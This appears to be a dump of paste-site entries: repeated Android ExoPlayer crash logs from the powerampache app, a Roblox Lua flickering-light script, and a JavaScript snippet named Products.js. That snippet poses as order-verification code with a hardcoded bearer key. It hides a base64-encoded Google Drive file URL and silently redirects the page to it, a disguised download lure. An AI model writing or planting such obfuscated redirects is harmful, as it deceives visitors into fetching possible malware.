error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
7yLYgJfe,2025-04-20T16:56:35.769,powerampache,PHP,Sunday 20th of April 2025 09:56:38 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":27},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762488205,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
tMQEApKN,2025-04-20T16:56:35.383,powerampache,PHP,Sunday 20th of April 2025 09:56:38 AM CDT,"1.01-76 (76) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loop(Looper.java:236)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":27},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":762487767,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":236,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
2uP5eSK1,Products.js,jm33,JavaScript,Sunday 20th of April 2025 09:47:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58045/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6UPvD47M,Flickering Lights,OnFireRobloxScriptin,Lua,Sunday 20th of April 2025 09:47:09 AM CDT,"--//Variables
local light = script.Parent
local spotlight = light.SpotLight

while true do
    if math.random() < 0.1 then
        spotlight.Enabled = false
        task.wait(0.1)
        spotlight.Enabled = true
    end
    task.wait(0.1)
end"
